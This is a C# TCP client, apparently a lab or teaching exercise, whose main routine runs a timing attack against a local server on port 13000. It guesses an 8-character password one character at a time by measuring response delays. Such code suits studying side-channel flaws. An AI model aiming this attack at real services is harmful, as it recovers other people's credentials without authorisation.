using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Sockets;

namespace tcpip_client
{
    class Program_Client
    {
        static void Main(string[] args)
        {
            Console.WriteLine("client started...");
//            Connect("127.0.0.1", 13000, "hello");
            TimingAttack("127.0.0.1", 13000);
            Console.WriteLine("\n Press Enter to continue...");
            Console.Read();
        }
        static void Connect(String server, Int32 port, String message)
        {
            try
            {
                // Create a TcpClient.
                // Note, for this client to work you need to have a TcpServer 
                // connected to the same address as specified by the server, port
                // combination.
                //Int32 port = 13000;
                using (TcpClient client = new TcpClient(server, port))
                {
                    // Translate the passed message into ASCII and store it as a Byte array.
                    Byte[] data = System.Text.Encoding.ASCII.GetBytes(message);

                    // Get a client stream for reading and writing.
                    //  Stream stream = client.GetStream();

                    using (NetworkStream stream = client.GetStream())
                    {
                        // Send the message to the connected TcpServer. 
                        stream.Write(data, 0, data.Length);

                        Console.WriteLine("Sent: {0}", message);

                        // Receive the TcpServer.response.

                        // Buffer to store the response bytes.
                        data = new Byte[256];

                        // String to store the response ASCII representation.
                        String responseData = String.Empty;

                        // Read the first batch of the TcpServer response bytes.
                        Int32 bytes = stream.Read(data, 0, data.Length);
                        responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
                        Console.WriteLine("Received: {0}", responseData);
                    }
                }
            }
            catch (ArgumentNullException e)
            {
                Console.WriteLine("ArgumentNullException: {0}", e);
            }
            catch (SocketException e)
            {
                Console.WriteLine("SocketException: {0}", e);
            }
        }

        static void TimingAttack(String server, Int32 port)
        {
            using (TcpClient client = new TcpClient(server, port))
            using (NetworkStream stream = client.GetStream())
            {
                List<char> possiblePassowrdChars = new List<char>();
                possiblePassowrdChars.AddRange(Enumerable.Range(0, 10).Select(i=>Convert.ToChar('0' + i)));
                possiblePassowrdChars.AddRange(Enumerable.Range(0, 26).Select(i=>Convert.ToChar('a' + i)));
//                possiblePassowrdChars.AddRange(Enumerable.Range(0, 26).Select(i=>Convert.ToChar('A' + i)));

                TimeSpan maxSpan = TimeSpan.Zero;
                Char foundKeyChar = '.';
                string foundPassword = "";
                const int sizeOfPassword = 8;
                foreach (int sizeOfNotFound in Enumerable.Range(1, sizeOfPassword).Reverse())
                {
                    foreach (char passwordChar in possiblePassowrdChars)
                    {
                        string message = "password:" + foundPassword + passwordChar + String.Join("", Enumerable.Repeat(".", sizeOfNotFound-1));
                        Byte[] data = System.Text.Encoding.ASCII.GetBytes(message);
                        Byte[] answer = new Byte[256];
                        int sizeOfAnswer = 0;
                        String responseData = "";

                        TimeSpan current = TimeSpan.Zero;
                        int repeaterForEachChar = 10;
                        for (int i = 0; i < repeaterForEachChar; i++)
                        {
                            Stopwatch stop = new Stopwatch();
                            stop.Start();
                            stream.Write(data, 0, data.Length);
                            sizeOfAnswer = stream.Read(answer, 0, data.Length);
                            stop.Stop();
                            if (i!=0)   // for warm
                                current += stop.Elapsed;
                        }
                        responseData = System.Text.Encoding.ASCII.GetString(answer, 0, sizeOfAnswer);
                        if (current > maxSpan)
                        {
                            maxSpan = current;
                            foundKeyChar = passwordChar;
                        }
                        Console.WriteLine("For {0} received: {1}, Elapsed = {2}", message, responseData, current);
                        if (responseData == "True")
                        {
                            Console.WriteLine("Found password: {0}", message);
                            break;
                        }
                    }
                    foundPassword += foundKeyChar;
                    Console.WriteLine("Found char: {0}", foundKeyChar);                    
                    Console.WriteLine("Found password: {0}", foundPassword);                    
                }                
            }
        }
    }
}
